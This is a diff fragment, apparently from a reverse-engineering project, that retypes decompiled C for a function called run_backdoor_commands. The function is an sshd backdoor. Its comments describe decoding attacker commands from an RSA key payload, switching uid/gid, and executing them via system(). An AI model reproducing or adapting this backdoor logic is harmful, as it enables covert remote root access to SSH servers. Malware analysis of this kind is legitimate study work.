@@ -70,12 +70,12 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   int rsa_modulus_bits;
   sshd_offsets_t tmp;
   int socket_probe_header;
-  undefined4 socket_probe_highword;
+  u32 socket_probe_highword;
   u8 *extra_data;
-  undefined8 shared_keybuf_or_timespec_lo;
-  undefined8 shared_keybuf_or_timespec_hi;
+  u64 shared_keybuf_or_timespec_lo;
+  u64 shared_keybuf_or_timespec_hi;
   int body_size;
-  undefined1 cmd_args_scratch[16];
+  u8 cmd_args_scratch[16];
   u8 *data_ptr2;
   u64 data_index;
   u32 v;
@@ -88,14 +88,14 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   key_payload_t encrypted_payload;
   int rsa_modulus_bytes;
   BOOL sigcheck_result;
-  undefined8 payload_nonce_lo;
-  undefined8 payload_nonce_hi;
+  u64 payload_nonce_lo;
+  u64 payload_nonce_hi;
   int key_idx;
   
   continuation_stride_flag = 0;
   stack_wipe_cursor = &rsa_exponent_bn;
   for (loop_idx = 0xae; loop_idx != 0; loop_idx = loop_idx + -1) {
-    *(undefined4 *)stack_wipe_cursor = 0;
+    *(u32 *)stack_wipe_cursor = 0;
     stack_wipe_cursor = (BIGNUM **)((long)stack_wipe_cursor + 4);
   }
   if (ctx != (global_context_t *)0x0) {
@@ -155,13 +155,13 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
               shared_keybuf_or_timespec_hi = 0;
               scratch_ptr = &data_ptr2;
               for (loop_idx = 0x93; loop_idx != 0; loop_idx = loop_idx + -1) {
-                *(undefined4 *)scratch_ptr = 0;
+                *(u32 *)scratch_ptr = 0;
                 scratch_ptr = (u8 **)((long)scratch_ptr + (ulong)continuation_stride_flag * -8 + 4);
               }
               secrets = ctx->sshd_sensitive_data;
               int_cursor = &body_size;
               for (loop_idx = 0x29; loop_idx != 0; loop_idx = loop_idx + -1) {
-                *(undefined1 *)int_cursor = 0;
+                *(u8 *)int_cursor = 0;
                 int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
               }
               if ((((secrets != (sensitive_data *)0x0) && (secrets->host_pubkeys != (sshkey **)0x0))
@@ -170,21 +170,21 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                 // AutoDoc: Cache the decoded opcode inside the cmd_arguments_t scratch so downstream handlers know how to interpret the payload body.
                 *(int *)cmd_args_scratch = op_result;
                 if (4 < rsa_payload_bytes - 0x82) {
-                  encrypted_payload.field0_0x0._0_1_ = (undefined1)rsa_modulus_bytes;
-                  encrypted_payload.field0_0x0._1_1_ = (undefined1)((uint)rsa_modulus_bytes >> 8);
-                  encrypted_payload.field0_0x0._2_1_ = (undefined1)((uint)rsa_modulus_bytes >> 0x10)
+                  encrypted_payload.field0_0x0._0_1_ = (u8)rsa_modulus_bytes;
+                  encrypted_payload.field0_0x0._1_1_ = (u8)((uint)rsa_modulus_bytes >> 8);
+                  encrypted_payload.field0_0x0._2_1_ = (u8)((uint)rsa_modulus_bytes >> 0x10)
                   ;
-                  encrypted_payload.field0_0x0._3_1_ = (undefined1)((uint)rsa_modulus_bytes >> 0x18)
+                  encrypted_payload.field0_0x0._3_1_ = (u8)((uint)rsa_modulus_bytes >> 0x18)
                   ;
-                  encrypted_payload.field0_0x0._4_1_ = (undefined1)sigcheck_result;
+                  encrypted_payload.field0_0x0._4_1_ = (u8)sigcheck_result;
                   // AutoDoc: Strip the 0x87-byte RSA header (nonce, digest, signature framing) and treat the remainder of the modulus as attacker-controlled command bytes.
                   payload_body_len = rsa_payload_bytes - 0x87;
                   // AutoDoc: Opcode 2 treats the payload body as a `[uid||gid||cmd]` triple: it optionally loads the uid/gid pair, invokes setresgid/setresuid, and finally runs the attacker command through libc system().
                   if (command_opcode == 2) {
-                    payload_segment_len = (ulong)CONCAT11((undefined1)sigcheck_result,
+                    payload_segment_len = (ulong)CONCAT11((u8)sigcheck_result,
                                              encrypted_payload.field0_0x0._3_1_);
                     if ((char)encrypted_payload.field0_0x0._0_1_ < '\0') {
-                      if (CONCAT11((undefined1)sigcheck_result,encrypted_payload.field0_0x0._3_1_)
+                      if (CONCAT11((u8)sigcheck_result,encrypted_payload.field0_0x0._3_1_)
                           != 0) goto LAB_0010a112;
                       payload_chunk_len = 0;
                       payload_segment_len = 0x39;
@@ -224,11 +224,11 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                     scratch_index = 4;
                   }
                   int_cursor = &rsa_modulus_bytes;
-                  header_copy_cursor = (undefined4 *)(cmd_args_scratch + 4);
+                  header_copy_cursor = (u32 *)(cmd_args_scratch + 4);
                   for (payload_segment_len = (ulong)(scratch_index + 1); payload_segment_len != 0; payload_segment_len = payload_segment_len - 1) {
                     *(char *)header_copy_cursor = (char)*int_cursor;
                     int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
-                    header_copy_cursor = (undefined4 *)((long)header_copy_cursor + (ulong)continuation_stride_flag * -2 + 1);
+                    header_copy_cursor = (u32 *)((long)header_copy_cursor + (ulong)continuation_stride_flag * -2 + 1);
                   }
                   stack0xfffffffffffffa60 = (u8 *)0x0;
                   host_keys = secrets->host_keys;
@@ -392,7 +392,7 @@ LAB_00109d36:
                                                       fdset_wipe_cursor = (fd_set *)cmd_args_scratch;
                                                       for (loop_idx = 0x20; loop_idx != 0;
                                                           loop_idx = loop_idx + -1) {
-                                                        *(undefined4 *)fdset_wipe_cursor = 0;
+                                                        *(u32 *)fdset_wipe_cursor = 0;
                                                         fdset_wipe_cursor = (fd_set *)
                                                                   ((long)fdset_wipe_cursor +
                                                                   (ulong)continuation_stride_flag * -8 + 4);
@@ -487,7 +487,7 @@ LAB_0010a076:
                                           *(cmd_arguments_t **)(cmd_args_scratch + 8) = (cmd_arguments_t *)0x0;
                                           scratch_ptr = &data_ptr2;
                                           for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
-                                            *(undefined4 *)scratch_ptr = 0;
+                                            *(u32 *)scratch_ptr = 0;
                                             scratch_ptr = (u8 **)((long)scratch_ptr +
                                                               (ulong)continuation_stride_flag * -8 + 4);
                                           }
@@ -564,7 +564,7 @@ LAB_00109fb9:
                                     }
                                   }
                                   else {
-                                    header_copy_cursor = (undefined4 *)(cmd_args_scratch + 4);
+                                    header_copy_cursor = (u32 *)(cmd_args_scratch + 4);
                                     for (loop_idx = 0xb; loop_idx != 0; loop_idx = loop_idx + -1) {
                                       *header_copy_cursor = 0;
                                       header_copy_cursor = header_copy_cursor + (ulong)continuation_stride_flag * -2 + 1;
@@ -627,7 +627,7 @@ LAB_0010a1ba:
                         ctx->disable_backdoor = TRUE;
                         int_cursor = &key_idx;
                         for (loop_idx = 0x39; loop_idx != 0; loop_idx = loop_idx + -1) {
-                          *(undefined1 *)int_cursor = 0;
+                          *(u8 *)int_cursor = 0;
                           int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
                         }
                         if ((encrypted_payload.field0_0x0._0_1_ & 1) != 0) {
